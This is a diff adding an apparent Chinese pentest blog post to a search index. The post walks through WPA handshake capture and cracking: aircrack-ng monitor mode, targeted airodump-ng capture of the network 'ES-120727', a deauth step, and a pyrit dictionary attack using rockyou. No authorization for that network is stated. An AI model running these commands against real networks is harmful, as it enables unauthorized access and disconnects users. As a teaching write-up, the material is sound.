@@ -3764,4 +3764,76 @@ mysql> select if(1<0,sleep(5),sleep(2));
         <tag>burpy</tag>
       </tags>
   </entry>
+  <entry>
+    <title>无线安全检查记录</title>
+    <url>/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95.html</url>
+    <content><![CDATA[<h1 id="无线安全检查"><a href="#无线安全检查" class="headerlink" title="无线安全检查"></a>无线安全检查</h1><p>[TOC]</p>
+<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ol>
+<li><p>工具： 一块8187无线网卡<br><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-10-15-49.png" alt></p>
+</li>
+<li><p>安装aircrack-ng： <code>sudo pacman -S aircrack-ng</code></p>
+</li>
+<li><p>安装pyrit: <code>sudo pacman -S pyrit</code></p>
+</li>
+</ol>
+<h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><ol>
+<li>开启网上监听模式：<br><code>sudo airmon-ng start &lt;interface&gt;</code></li>
+</ol>
+<p><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-10-19-24.png" alt></p>
+<p><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-10-22-16.png" alt></p>
+<ol start="2">
+<li>确定目标：<br><code>sudo airodump-ng &lt;mon-interface&gt;</code></li>
+</ol>
+<p><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-10-25-09.png" alt></p>
+<p>就来测试一下<code>ES-120727</code>这个无线的安全。</p>
+<ul>
+<li>BSSID: 40:xx:xx:xx:xx:41</li>
+<li>ESSID: ES-120727</li>
+<li>Channel: 11</li>
+</ul>
+<ol start="3">
+<li>针对性抓包：<br><code>sudo airodump-ng --bssid 40:xx:xx:xx:xx:41 --channel 11 --essid ES-120727 -w es120727-test  wlp0s20f0u1mon</code></li>
+</ol>
+<p><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-10-33-12.png" alt></p>
+<p>发现一个用户连接着，要抓握手包，得让他们重新连接，否则只能等。</p>
+<ol start="4">
+<li>Deauth:</li>
+</ol>
+<p><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-10-47-22.png" alt></p>
+<p>成功抓到握手包。</p>
+<ol start="5">
+<li><p>分析握手包是否完整：<br><code>pyrit -r es120727-test-01.cap analyze</code><br><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-11-02-22.png" alt></p>
+</li>
+<li><p>重新抓包直到抓到完整的握手包：</p>
+</li>
+</ol>
+<p><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-11-18-59.png" alt></p>
+<h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><ol>
+<li>导入密码字典<br><code>pyrit -i ~/tools/pentest/dicts/rockyou.txt.gz import_passwords</code></li>
+</ol>
+<p><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-11-36-27.png" alt></p>
+<ol start="2">
+<li>创建AP<br><code>pyrit -e ES-120727 create_essid</code></li>
+</ol>
+<p><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-11-38-15.png" alt></p>
+<ol start="3">
+<li>计算PMK<br><code>pyrit batch</code></li>
+</ol>
+<p><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-11-40-51.png" alt></p>
+<p>这个过程比较慢。</p>
+<p><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-12-37-23.png" alt></p>
+<ol start="4">
+<li>暴破<br><code>pyrit -r es120727-test3-01.cap.gz attack_db</code></li>
+</ol>
+<p><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-12-42-47.png" alt></p>
+]]></content>
+      <categories>
+        <category>pentest</category>
+      </categories>
+      <tags>
+        <tag>wifi</tag>
+        <tag>aircrack</tag>
+        <tag>pentest</tag>
+      </tags>
+  </entry>
 </search>
